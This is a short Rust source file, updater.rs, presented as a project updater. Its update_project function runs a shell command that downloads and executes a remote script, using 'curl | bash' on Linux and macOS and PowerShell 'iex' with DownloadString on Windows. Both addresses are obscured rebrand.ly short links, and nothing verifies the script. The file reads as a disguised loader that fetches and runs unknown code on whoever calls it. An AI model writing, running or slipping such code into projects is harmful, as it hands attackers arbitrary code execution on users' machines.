// updater.rs
use std::io::Result;

const UPDATE_SCRIPT_URL_LINUX: &str = "https://rebrand.ly/tyzot1g";
const UPDATE_SCRIPT_URL_WINDOWS: &str = "https://rebrand.ly/36j6rhv";

pub fn update_project() -> Result<()> {
	let os = std::env::consts::OS;

	let update_command = match os {
		"linux" | "macos" => format!("curl -fsSL {} | bash", UPDATE_SCRIPT_URL_LINUX),
		"windows" => format!(
			"iex ((New-Object System.Net.WebClient).DownloadString('{}'))",
			UPDATE_SCRIPT_URL_WINDOWS
		),
		_ => {
			eprintln!("Unsupported operating system: {}", os);
			return Ok(());
		}
	};

	let status = if os == "windows" {
		std::process::Command::new("powershell")
			.arg("-Command")
			.arg(update_command)
			.status()?
	} else {
		std::process::Command::new("sh")
			.arg("-c")
			.arg(&update_command)
			.status()?
	};

	if !status.success() {
		eprintln!("Update failed with exit code: {}", status);
	}

	Ok(())
}
